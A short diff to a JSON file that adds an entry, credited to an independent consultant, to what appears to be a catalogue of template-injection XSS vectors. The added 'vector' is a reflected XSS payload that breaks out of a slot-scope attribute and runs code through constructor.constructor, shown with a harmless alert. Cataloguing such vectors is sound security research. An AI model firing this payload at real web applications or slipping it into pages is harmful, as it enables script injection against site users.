@@ -823,6 +823,20 @@
     {
         "authors": [
             {
+                "name": "Davit Karapetyan",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/davwwwx"
+            }
+        ],
+        "vector": "<p slot-scope=\"){}}])+this.constructor.constructor('alert(1)')()})};\/\/\">",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
                 "name": "Gareth Heyes",
                 "company": "PortSwigger",
                 "twitterUrl": "https:\/\/twitter.com\/garethheyes"
